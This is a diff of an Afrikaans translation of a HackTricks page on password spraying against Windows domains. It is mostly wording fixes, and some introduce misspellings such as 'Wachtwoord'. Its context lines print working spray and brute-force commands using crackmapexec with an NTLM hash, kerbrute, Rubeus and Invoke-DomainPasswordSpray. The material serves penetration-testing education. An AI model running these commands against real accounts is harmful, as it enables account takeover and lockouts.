@@ -1,16 +1,16 @@
-# Wagtwoord Spuit / Brute Force
+# Wachtwoord Spuiting / Brute Force
 
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## **Wagtwoord Spuit**
+## **Wachtwoord Spuiting**
 
 Sodra jy verskeie **geldige gebruikersname** gevind het, kan jy die mees **gewone wagwoorde** probeer (hou die wagwoordbeleid van die omgewing in gedagte) met elkeen van die ontdekte gebruikers.\
-Volgens **standaard** is die **minimum** **wagwoord** **lengte** **7**.
+Deur **standaard** is die **minimum** **wagwoord** **lengte** **7**.
 
 Lyste van algemene gebruikersname kan ook nuttig wees: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Let daarop dat jy **sekere rekeninge kan sluit as jy verskeie verkeerde wagwoorde probeer** (volgens standaard meer as 10).
+Let daarop dat jy **sekere rekeninge kan sluit as jy verskeie verkeerde wagwoorde probeer** (deur standaard meer as 10).
 
 ### Kry wagwoordbeleid
 
@@ -51,7 +51,7 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Gebruik [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIE AANBEVEEL NIE, WERK SOMS NIE
+- Gebruik [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIE AANBEVEEL NIE, WERK SOMTYDS NIE
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
@@ -77,8 +77,8 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Met [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Dit kan gebruikers uit die domein genereer volgens die verstek en dit sal die wagwoordbeleid van die domein kry en pogings volgens dit beperk):
-```powershell
+- Met [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Dit kan gebruikers uit die domein genereer volgens die verstek en dit sal die wagwoordbeleid van die domein verkry en pogings volgens dit beperk):
+```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 - Met [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
